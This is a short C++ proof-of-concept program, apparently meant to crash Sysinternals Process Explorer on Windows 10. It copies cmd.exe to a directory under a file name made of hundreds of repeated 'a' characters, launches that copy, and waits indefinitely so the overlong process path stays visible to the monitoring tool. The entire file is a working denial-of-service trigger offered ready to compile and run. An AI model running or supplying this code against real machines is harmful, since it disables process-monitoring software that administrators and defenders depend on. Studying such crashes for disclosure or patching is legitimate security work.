// ProcessExplorerCrash.cpp : Defines the entry point for the console application.
//
#include "stdafx.h"
#include "windows.h"
#include "stdio.h"


//Tested on Windows 10 Pro 64-Bit
//Version	20H2
//Installed on	‎2/‎20/‎2021
//OS build	19042.928
//Experience	Windows Feature Experience Pack 120.2212.551.0
int _tmain(int argc, _TCHAR* argv[])
{
	wchar_t PathName[MAX_PATH+1]={0};
	wcscpy(PathName,L"C:\\t\\");

	if(!CreateDirectory(PathName,0))
	{
		//printf("Directory creation failed.\r\n");
		//return -1;
	}

	
	
	wchar_t* pCrashName = L"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.exe";
	wcscat(PathName,pCrashName);
	wprintf(L"Path: %s\r\n",PathName);




	wchar_t SysPathName[MAX_PATH+1]={0};
	GetSystemDirectory(SysPathName,MAX_PATH);
	wcscat(SysPathName,L"\\cmd.exe");
	//wprintf(L"%s\r\n",SysPathName);

	CopyFile(SysPathName,PathName,FALSE);


	STARTUPINFO SI={sizeof(SI)};
	PROCESS_INFORMATION PI={0};

	CreateProcess(PathName,0,0,0,TRUE,0,0,0,&SI,&PI);
	
	Sleep(-1);
	return 0;
}

